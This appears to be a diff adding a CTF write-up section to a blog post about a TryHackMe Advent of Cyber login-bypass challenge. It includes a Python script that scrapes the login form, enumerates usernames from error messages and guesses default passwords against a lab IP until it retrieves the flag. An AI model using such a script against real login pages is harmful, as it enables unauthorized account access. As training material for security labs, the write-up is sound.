@@ -253,10 +253,90 @@ Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
 
 ## Day 3 ##
 
-- Web
-- Christmas Chaos
-- Hack the hackers and bypass a login page to gain admin privileges.
-- Authentication Bypass
+### Christmas Chaos - web exploitation
+
+> Hack the hackers and bypass a login page to gain admin privileges.
+
+This one was super fun to automate, as I was able to solve it without even opening the site in a browswer. Of course, I did not use **burpsuite** which was a learning objective of the challenge. But oh well. Also I was able to pull all the information for the form from the html using _beautifulsoup_ (request method and login end-point).
+
+![](../assets/images/adventofcyber/day3-site.png)
+
+Here are the highlights:
+- Access the site, extract the form from the response
+- Get the form action and form method
+- Extract the input fields of the form
+- Submit provided usernames with known bad password.
+- Don't follow redirects and see response on status of username
+- Identify the correct username
+- Submit known username with provided passwords
+- Don't follow redirects and see response on status of password
+- Submit known username and password, this time following redirects
+- Grab flag using regular expression of known format
+- Profit.
+
+
+```python
+#!/usr/bin/env python3
+
+import requests
+from bs4 import BeautifulSoup as bs
+import re
+
+flagpattern = re.compile('THM{[^}]*}')
+
+url = "http://10.10.51.66"
+
+s = requests.session()
+r = s.get(url)
+
+soup = bs(r.text,features='lxml')
+
+methods = {'post': s.post, 'get': s.get}
+
+form = soup.find_all('form')[0]
+inputs = [element['name'] for element in form.find_all('input') ]
+form_url = form.get('action')
+form_method = form.get('method')
+
+usernames = ['root', 'admin', 'user']
+passwords = ['root', 'password', '12345']
+
+for username in usernames:
+    password = "thisisnotthepassword"
+    inputs = [element['name'] for element in form.find_all('input') ]
+    payload = {}
+    for i in inputs:
+        payload[i] = vars()[i]
+    r = methods[form_method](url + form_url, data = payload, allow_redirects=False)
+    if 'username_incorrect' not in r.text:
+        print(f'Username found to be {username}')
+        break
+
+for password in passwords:
+    inputs = [element['name'] for element in form.find_all('input') ]
+    payload = {}
+    for i in inputs:
+        payload[i] = vars()[i]
+    r = methods[form_method](url + form_url, data = payload, allow_redirects=False)
+    if 'password_incorrect' not in r.text:
+        print(f'Password found to be {password}')
+        break
+
+r = methods[form_method](url + form_url, data=payload)
+match = flagpattern.findall(r.text)
+if match:
+    print(f'Flag is {match[0]}')
+
+```
+
+Running the scripts we get the following output and [redacted] flag.
+
+```
+Username found to be admin
+Password found to be 12345
+Flag is THM{885ff...9d8fe99ad1a}
+
+```
 
 ## Day 4 ##
 - Web
